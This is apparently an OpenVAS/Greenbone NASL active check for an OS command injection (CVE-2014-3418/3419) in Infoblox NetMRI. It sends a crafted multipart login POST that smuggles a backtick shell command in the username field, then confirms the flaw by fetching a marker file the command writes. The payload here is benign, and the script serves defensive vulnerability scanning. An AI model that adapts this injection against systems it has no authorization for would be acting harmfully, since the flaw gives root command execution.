# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:infoblox:netmri";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105061");
  script_version("2025-06-09T05:41:14+0000");
  script_tag(name:"last_modification", value:"2025-06-09 05:41:14 +0000 (Mon, 09 Jun 2025)");
  script_tag(name:"creation_date", value:"2014-07-15 14:33:34 +0200 (Tue, 15 Jul 2014)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2014-3418", "CVE-2014-3419");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Infoblox NetMRI < 6.8.5 OS Command Injection Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_infoblox_netmri_consolidation.nasl");
  script_mandatory_keys("infoblox/netmri/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"Infoblox NetMRI is prone to an OS command injection
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"impact", value:"An attacker may leverage these issues to execute arbitrary code
  as root.");

  script_tag(name:"affected", value:"Infoblox NetMRI version 6.4.x through 6.8.4.x. Other versions
  may also be affected.");

  script_tag(name:"solution", value:"Update version to 6.8.5 or later.");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/127409/Infoblox-6.8.4.x-OS-Command-Injection.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");

include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

vtstrings = get_vt_strings();
check = vtstrings["lowercase_rand"];
file  = vtstrings["default"] + '_RCE_Check.txt';
bound = rand();

payload = "echo " + check + " > /var/home/tools/skipjack/app/webui/" + file;

data = '-----------------------------' + bound  + '\r\n' +
      'Content-Disposition: form-data; name="_formStack"\r\n' +
      '\r\n' +
      'netmri/config/userAdmin/login\r\n' +
      '-----------------------------' + bound + '\r\n' +
      'Content-Disposition: form-data; name="mode"\r\n' +
      '\r\n'  +
      'DO-LOGIN\r\n' +
      '-----------------------------' + bound + '\r\n' +
      'Content-Disposition: form-data; name="eulaAccepted"\r\n' +
      '\r\n' +
      'Decline\r\n' +
      '-----------------------------' + bound + '\r\n' +
      'Content-Disposition: form-data; name="TrustToken"\r\n' +
      '\r\n' +
      '\r\n' +
      '-----------------------------' + bound + '\r\n' +
      'Content-Disposition: form-data; name="skipjackUsername"\r\n' +
      '\r\n' +
      'admin`' + payload + '`\r\n' +
      '-----------------------------' + bound + '\r\n' +
      'Content-Disposition: form-data; name="skipjackPassword"\r\n' +
      '\r\n' +
      'admin\r\n' +
      '-----------------------------' + bound + '\r\n' +
      'Content-Disposition: form-data; name="weakPassword"\r\n' +
      '\r\n' +
      'true\r\n' +
      '-----------------------------' + bound + '\r\n' +
      'Content-Disposition: form-data; name="x"\r\n' +
      '\r\n' +
      '0\r\n' +
      '-----------------------------' + bound + '\r\n' +
      'Content-Disposition: form-data; name="y"\r\n' +
      '\r\n' +
      '0\r\n' +
      '-----------------------------' + bound + '--';

url = "/netmri/config/userAdmin/login.tdf";

headers = make_array( "Content-Type", "multipart/form-data; boundary=---------------------------" + bound );

req = http_post_put_req( port:port, url:url, data:data, add_headers:headers );
res = http_send_recv( port:port, data:req );

if( ! res || res !~ "^HTTP/1\.[01] 200" )
  exit( 0 );

url = "/webui/" + file;

req = http_get( port:port, item:url );
res = http_send_recv( port:port, data:req);

if( check >< res ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report, expert_info:'Request:\n' + req + '\nResponse:\n' + res );
  exit( 0 );
}

exit( 99 );
